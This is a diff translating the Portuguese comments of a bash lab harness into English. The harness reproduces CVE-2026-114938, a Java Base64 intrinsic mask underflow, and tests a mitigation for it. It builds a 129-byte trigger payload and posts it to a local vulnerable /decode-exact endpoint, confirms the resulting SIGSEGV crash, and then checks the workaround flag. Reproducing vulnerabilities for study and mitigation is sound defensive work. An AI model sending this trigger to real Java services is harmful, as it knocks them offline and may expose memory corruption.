@@ -1,9 +1,9 @@
 #!/usr/bin/env bash
-# Teste nao interativo de ponta a ponta, sem AWS (Intel SDE).
-# Uso: ./run-lab.sh
+# Non-interactive end-to-end test, cloud-free (Intel SDE).
+# Usage: ./run-lab.sh
 #
-# Autor do harness: eduxcode (github.com/eduxcode)
-# Primitiva: CVE-2026-114938 / Quang Luong - Calif.io
+# Lab author: eduxcode (github.com/eduxcode)
+# Primitive: CVE-2026-114938 / Quang Luong - Calif.io
 set -uo pipefail
 LAB="$(cd "$(dirname "$0")" && pwd)"
 cd "$LAB"
@@ -15,8 +15,8 @@ warn() { printf '  \033[33m[!]\033[0m %s\n' "$*"; }
 bad()  { printf '  \033[31m[x]\033[0m %s\n' "$*"; }
 
 if [ "$SDE_MODE" != 1 ]; then
-  warn "SDE/JDK ausentes. Rodando ./demo/setup-sde.sh..."
-  "$LAB/demo/setup-sde.sh" || { bad "setup falhou"; exit 1; }
+  warn "SDE/JDK missing. Running ./demo/setup-sde.sh..."
+  "$LAB/demo/setup-sde.sh" || { bad "setup failed"; exit 1; }
   source "$LAB/demo/env.sh"
 fi
 
@@ -28,22 +28,22 @@ TARGET_PID=""
 cleanup() { [ -n "$TARGET_PID" ] && kill "$TARGET_PID" 2>/dev/null; }
 trap cleanup EXIT
 
-step "0. Ambiente"
+step "0. Environment"
 echo "  host: $(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs)"
 echo "  SDE : $($SDE -version 2>&1 | head -1)"
 echo "  JDK : $($J4S_JAVA -version 2>&1 | head -1)"
 "$SDE" -icx -- "$J4S_JAVA" -XX:+PrintFlagsFinal -version 2>/dev/null \
   | awk '/UseAVX|UseBASE64Intrinsics/ {print "  flag:" $0}'
 
-step "1. Causa raiz: underflow da mascara (Java puro)"
+step "1. Root cause: mask underflow (pure Java)"
 "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" -cp "$J4S_BUILD" MaskUnderflow 2>&1 | sed -n '1,10p'
 
-step "2. Oraculo: comprimento correto e janela OOB"
+step "2. Oracle: correct length and OOB window"
 J4S_SDE=1 "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" \
   -cp "$J4S_BUILD" Oracle --warmup 5000 2>&1 | tee "$EVID/oracle.txt"
 ORACLE_RC=${PIPESTATUS[0]}
 
-start_target() { # flags extras
+start_target() { # extra flags
   "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" "$@" \
     -XX:ErrorFile="$EVID/hs_err_%p.log" \
     -Dwarmup=5000 -Dport="$PORT" -cp "$J4S_BUILD" DecodeServer \
@@ -59,17 +59,17 @@ wait_health() {
   return 1
 }
 
-step "3. Alvo vulneravel"
+step "3. Vulnerable target"
 start_target
-wait_health || { bad "alvo nao subiu"; tail -20 "$EVID/target.log"; exit 1; }
-ok "no ar: $(curl -s "$BASE/health")"
+wait_health || { bad "target did not start"; tail -20 "$EVID/target.log"; exit 1; }
+ok "up: $(curl -s "$BASE/health")"
 
 step "4. Baseline"
 python3 -c 'import sys;sys.stdout.write("A"*64)' > "$EVID/valid.txt"
 python3 -c 'import sys;sys.stdout.write("A"*128+"=")' > "$EVID/trigger.txt"
 echo "  $BASE/decode-safe 64x'A' -> $(curl -s -m 10 -X POST --data-binary @"$EVID/valid.txt" "$BASE/decode-safe")"
 
-step "5. Gatilho de 129 bytes em /decode-exact"
+step "5. 129-byte trigger on /decode-exact"
 curl -s -m 30 -o "$EVID/response.json" -w '  http=%{http_code}\n' \
   -X POST --data-binary @"$EVID/trigger.txt" "$BASE/decode-exact"
 cat "$EVID/response.json"; echo
@@ -80,10 +80,10 @@ for _ in $(seq 1 20); do
 done
 
 if kill -0 "$TARGET_PID" 2>/dev/null; then
-  bad "alvo continuou de pe"
+  bad "target is still standing"
   ALIVE=1
 else
-  ok "alvo caiu (SIGSEGV), como esperado"
+  ok "target crashed (SIGSEGV), as expected"
   ALIVE=0
   HS=$(ls "$EVID"/hs_err_*.log 2>/dev/null | head -1)
   [ -n "${HS:-}" ] && grep -E '^#  SIG|^# Problematic|^# V  \[' "$HS" | head -3
@@ -93,29 +93,29 @@ TARGET_PID=""
 
 step "6. Workaround: -XX:-UseBASE64Intrinsics"
 start_target -XX:-UseBASE64Intrinsics
-wait_health || { bad "alvo com workaround nao subiu"; tail -20 "$EVID/target.log"; exit 1; }
+wait_health || { bad "target with workaround did not start"; tail -20 "$EVID/target.log"; exit 1; }
 echo "  health: $(curl -s "$BASE/health")"
-curl -s -m 30 -o "$EVID/response-safe.json" -w '  gatilho -> http=%{http_code}\n' \
+curl -s -m 30 -o "$EVID/response-safe.json" -w '  trigger -> http=%{http_code}\n' \
   -X POST --data-binary @"$EVID/trigger.txt" "$BASE/decode-exact"
 cat "$EVID/response-safe.json"; echo
 sleep 1
 if curl -sf -m 3 "$BASE/health" >/dev/null 2>&1; then
-  ok "alvo sobreviveu com o intrinsic desligado"
+  ok "target survived with the intrinsic disabled"
   WORKAROUND=0
 else
-  bad "alvo caiu mesmo com o workaround"
+  bad "target crashed even with the workaround"
   WORKAROUND=1
 fi
 
-step "Resumo"
-echo "  oraculo ......... rc=$ORACLE_RC (0 = corrupcao reproduzida)"
-echo "  alvo ............ $([ "$ALIVE" = 0 ] && echo 'caiu com SIGSEGV' || echo 'continuou de pe')"
-echo "  workaround ...... $([ "$WORKAROUND" = 0 ] && echo 'funcional' || echo 'falhou')"
-echo "  evidencias ...... $EVID"
+step "Summary"
+echo "  oracle .......... rc=$ORACLE_RC (0 = corruption reproduced)"
+echo "  target .......... $([ "$ALIVE" = 0 ] && echo 'crashed with SIGSEGV' || echo 'still standing')"
+echo "  workaround ...... $([ "$WORKAROUND" = 0 ] && echo 'effective' || echo 'failed')"
+echo "  evidence ........ $EVID"
 
 if [ "$ORACLE_RC" = 0 ] && [ "$ALIVE" = 0 ] && [ "$WORKAROUND" = 0 ]; then
-  ok "reproducao completa: corrupcao + DoS + mitigacao"
+  ok "full reproduction: corruption + DoS + mitigation"
   exit 0
 fi
-warn "reproducao incompleta"
+warn "incomplete reproduction"
 exit 1
